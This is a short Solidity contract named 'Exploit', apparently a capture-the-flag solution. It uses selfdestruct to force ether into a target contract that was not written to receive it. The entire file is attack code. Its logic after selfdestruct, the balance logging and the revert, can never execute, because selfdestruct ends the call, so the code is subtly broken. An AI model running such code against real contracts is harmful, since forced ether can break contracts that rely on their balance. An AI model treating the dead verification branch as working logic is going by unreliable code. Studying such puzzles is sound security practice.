// SPDX-License-Identifier: UNLECINSED
pragma solidity ^0.8.0;

contract Exploit {
    address payable public force;

    event Log(string message, uint256 balance);

    constructor(address _force) {
        force = payable(_force);
    }

    function attack() public payable {
        uint256 forceBalance = address(force).balance;
        emit Log("Force balance before selfdestruct", forceBalance);

        selfdestruct(force);

        forceBalance = address(force).balance;
        if (forceBalance > 0) {
            emit Log("Force is has balance now!", forceBalance);
        } else {
            emit Log("Force still has'nt balance!", forceBalance);
            revert();
        }
    }
}
